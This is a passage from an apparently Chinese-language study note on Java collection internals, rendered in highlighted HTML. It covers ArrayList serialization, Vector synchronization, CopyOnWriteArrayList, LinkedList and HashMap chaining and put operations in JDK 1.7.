punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Write out size as capacity for behavioural compatibility with clone()</span>    s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Write out all elements in the proper order.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>elementData<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>modCount <span class="token operator">!=</span> expectedModCount<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentModificationException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="5-序列化"><a href="#5-序列化" class="headerlink" title="5. 序列化"></a>5. 序列化</h3><p>ArrayList 基于数组实现，并且具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。</p><p>保存元素的数组 elementData 使用 transient 修饰，该关键字声明数组默认不会被序列化。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">transient</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> elementData<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// non-private to simplify nested class access</span></code></pre><p>ArrayList 实现了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>    <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    elementData <span class="token operator">=</span> EMPTY_ELEMENTDATA<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read in size, and any hidden stuff</span>    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read in capacity</span>    s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ignored</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// be like clone(), allocate array based upon size not capacity</span>        <span class="token function">ensureCapacityInternal</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> elementData<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read in all elements in the proper order.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream s<span class="token punctuation">)</span>    <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Write out element count, and any hidden stuff</span>    <span class="token keyword">int</span> expectedModCount <span class="token operator">=</span> modCount<span class="token punctuation">;</span>    s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Write out size as capacity for behavioural compatibility with clone()</span>    s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Write out all elements in the proper order.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>elementData<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>modCount <span class="token operator">!=</span> expectedModCount<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentModificationException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>序列化时需要使用 ObjectOutputStream 的 writeObject() 将对象转换为字节流并输出。而 writeObject() 方法在传入的对象存在 writeObject() 的时候会去反射调用该对象的 writeObject() 来实现序列化。反序列化使用的是 ObjectInputStream 的 readObject() 方法，原理类似。</p><pre class=" language-java"><code class="language-java">ArrayList list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><h3 id="1-同步"><a href="#1-同步" class="headerlink" title="1. 同步"></a>1. 同步</h3><p>它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">ensureCapacityHelper</span><span class="token punctuation">(</span>elementCount <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    elementData<span class="token punctuation">[</span>elementCount<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">synchronized</span> E <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">>=</span> elementCount<span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ArrayIndexOutOfBoundsException</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">elementData</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="2-与-ArrayList-的比较"><a href="#2-与-ArrayList-的比较" class="headerlink" title="2. 与 ArrayList 的比较"></a>2. 与 ArrayList 的比较</h3><ul><li>Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制；</li><li>Vector 每次扩容请求其大小的 2 倍空间，而 ArrayList 是 1.5 倍。</li></ul><h3 id="3-替代方案"><a href="#3-替代方案" class="headerlink" title="3. 替代方案"></a>3. 替代方案</h3><p>可以使用 <code>Collections.synchronizedList();</code> 得到一个线程安全的 ArrayList。</p><pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>String<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> synList <span class="token operator">=</span> Collections<span class="token punctuation">.</span><span class="token function">synchronizedList</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类。</p><pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>String<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CopyOnWriteArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><h3 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h3><p>写操作在一个复制的数组上进行，读操作还是在原始数组中进行，读写分离，互不影响。</p><p>写操作需要加锁，防止并发写入时导致写入数据丢失。</p><p>写操作结束之后需要把原始数组指向新的复制数组。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> ReentrantLock lock <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lock<span class="token punctuation">;</span>    lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> elements <span class="token operator">=</span> <span class="token function">getArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> newElements <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>elements<span class="token punctuation">,</span> len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        newElements<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>        <span class="token function">setArray</span><span class="token punctuation">(</span>newElements<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>        lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">setArray</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    array <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span><span class="token keyword">private</span> E <span class="token function">get</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> a<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>CopyOnWriteArrayList 在写操作的同时允许读操作，大大提高了读操作的性能，因此很适合读多写少的应用场景。</p><p>但是 CopyOnWriteArrayList 有其缺陷：</p><ul><li>内存占用：在写操作时需要复制一个新的数组，使得内存占用为原来的两倍左右；</li><li>数据不一致：读操作不能读取实时性的数据，因为部分写操作的数据还未同步到读数组中。</li></ul><p>所以 CopyOnWriteArrayList 不适合内存敏感以及对实时性要求很高的场景。</p><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><h3 id="1-概览-1"><a href="#1-概览-1" class="headerlink" title="1. 概览"></a>1. 概览</h3><p>基于双向链表实现，使用 Node 存储链表节点信息。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token punctuation">{</span>    E item<span class="token punctuation">;</span>    Node<span class="token operator">&lt;</span>E<span class="token operator">></span> next<span class="token punctuation">;</span>    Node<span class="token operator">&lt;</span>E<span class="token operator">></span> prev<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>每个链表存储了 first 和 last 指针：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">transient</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> first<span class="token punctuation">;</span><span class="token keyword">transient</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> last<span class="token punctuation">;</span></code></pre><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/49495c95-52e5-4c9a-b27b-92cf235ff5ec.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/49495c95-52e5-4c9a-b27b-92cf235ff5ec.png" alt="img"></a></p><h3 id="2-与-ArrayList-的比较-1"><a href="#2-与-ArrayList-的比较-1" class="headerlink" title="2. 与 ArrayList 的比较"></a>2. 与 ArrayList 的比较</h3><ul><li>ArrayList 基于动态数组实现，LinkedList 基于双向链表实现；</li><li>ArrayList 支持随机访问，LinkedList 不支持；</li><li>LinkedList 在任意位置添加删除元素更快。</li></ul><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>为了便于理解，以下源码分析以 JDK 1.7 为主。</p><h3 id="1-存储结构"><a href="#1-存储结构" class="headerlink" title="1. 存储结构"></a>1. 存储结构</h3><p>内部包含了一个 Entry 类型的数组 table。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">transient</span> Entry<span class="token punctuation">[</span><span class="token punctuation">]</span> table<span class="token punctuation">;</span></code></pre><p>Entry 存储着键值对。它包含了四个字段，从 next 字段我们可以看出 Entry 是一个链表。即数组中的每个位置被当成一个桶，一个桶存放一个链表。HashMap 使用拉链法来解决冲突，同一个链表中存放哈希值相同的 Entry。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/8fe838e3-ef77-4f63-bf45-417b6bc5c6bb.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/8fe838e3-ef77-4f63-bf45-417b6bc5c6bb.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> K key<span class="token punctuation">;</span>    V value<span class="token punctuation">;</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> next<span class="token punctuation">;</span>    <span class="token keyword">int</span> hash<span class="token punctuation">;</span>    <span class="token function">Entry</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> K k<span class="token punctuation">,</span> V v<span class="token punctuation">,</span> Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        value <span class="token operator">=</span> v<span class="token punctuation">;</span>        next <span class="token operator">=</span> n<span class="token punctuation">;</span>        key <span class="token operator">=</span> k<span class="token punctuation">;</span>        hash <span class="token operator">=</span> h<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> K <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> key<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> V <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> V <span class="token function">setValue</span><span class="token punctuation">(</span>V newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>        V oldValue <span class="token operator">=</span> value<span class="token punctuation">;</span>        value <span class="token operator">=</span> newValue<span class="token punctuation">;</span>        <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token keyword">instanceof</span> <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        Map<span class="token punctuation">.</span>Entry e <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token punctuation">)</span>o<span class="token punctuation">;</span>        Object k1 <span class="token operator">=</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object k2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k1 <span class="token operator">==</span> k2 <span class="token operator">||</span> <span class="token punctuation">(</span>k1 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> k1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object v1 <span class="token operator">=</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object v2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>v1 <span class="token operator">==</span> v2 <span class="token operator">||</span> <span class="token punctuation">(</span>v1 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> v1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Objects<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> Objects<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="2-拉链法的工作原理"><a href="#2-拉链法的工作原理" class="headerlink" title="2. 拉链法的工作原理"></a>2. 拉链法的工作原理</h3><pre class=" language-java"><code class="language-java">HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"K1"</span><span class="token punctuation">,</span> <span class="token string">"V1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"K2"</span><span class="token punctuation">,</span> <span class="token string">"V2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"K3"</span><span class="token punctuation">,</span> <span class="token string">"V3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>新建一个 HashMap，默认大小为 16；</li><li>插入 &lt;K1,V1&gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。</li><li>插入 &lt;K2,V2&gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。</li><li>插入 &lt;K3,V3&gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 &lt;K2,V2&gt; 前面。</li></ul><p>应该注意到链表的插入是以头插法方式进行的，例如上面的 &lt;K3,V3&gt; 不是插在 &lt;K2,V2&gt; 后面，而是插入在链表头部。</p><p>查找需要分成两步进行：</p><ul><li>计算键值对所在的桶；</li><li>在链表上顺序查找，时间复杂度显然和链表的长度成正比。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/49d6de7b-0d0d-425c-9e49-a1559dc23b10.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/49d6de7b-0d0d-425c-9e49-a1559dc23b10.png" alt="img"></a></p><h3 id="3-put-操作"><a href="#3-put-操作" class="headerlink" title="3. put 操作"></a>3. put 操作</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>table <span class="token operator">==</span> EMPTY_TABLE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">inflateTable</span><span class="token punctuation">(</span>threshold<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 键为 null 单独处理</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">putForNullKey</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 确定桶下标</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            V oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">recordAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 插入新键值对</span>    <span class="token function">addEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>HashMap 允许插入键为 null 的键值对。但是因为无法调用 null 的 hashCode() 方法，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> V <span class="token function">putForNullKey</span><span class="token punctuation">(</span>V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            V oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">recordAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">addEntry</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">addEntry</span><span class="token punctuation">(</span><span class="token keyword">int</span> hash<span class="token punctuation">,</span> K key<span class="token punctuation">,</span> V value<span class="token punctuation">,</span> <span class="token keyword">int</span> bucketIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">>=</span> threshold<span class="token 